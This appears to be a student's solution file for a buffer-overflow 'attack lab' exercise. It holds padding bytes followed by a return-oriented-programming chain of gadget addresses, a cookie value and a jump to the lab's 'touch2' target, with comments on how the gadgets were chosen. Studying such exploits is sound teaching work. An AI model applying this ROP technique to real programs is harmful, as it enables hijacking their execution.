31 31 31 31 31 31 31 31  
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31 
31 31 31 31 31 31 31 31

/* first find the move instruction code where $rsi or $rdi is the destination then look for pop for each source one on the way back */

c7 19 40 00 00 00 00 00 /* pop $rcx (pop $rcx just before 90 no-op) */
fe 17 58 58 00 00 00 00 /* insert value just after pop, cookie + 1 (+1 comes from COMPUTE_VAL macro) */
53 19 40 00 00 00 00 00 /* move $rcx to $rax (since $rcx has pop in the gadgets stop here) */
96 19 40 00 00 00 00 00 /* move $rax to $rdi */
66 19 40 00 00 00 00 00 /* move $rdi to $rdx */
4c 19 40 00 00 00 00 00 /* move $rdx to $rsi first $rsi in order to prevent the collision, finding $rsi is modified $rdi (corruption!) */

c7 19 40 00 00 00 00 00 /* pop $rcx */
fd 17 58 58 00 00 00 00 /* cookie */
53 19 40 00 00 00 00 00 /* move $rcx to $rax */
96 19 40 00 00 00 00 00 /* move $rax to $rdi */
78 16 40 00 00 00 00 00 /* touch2 */

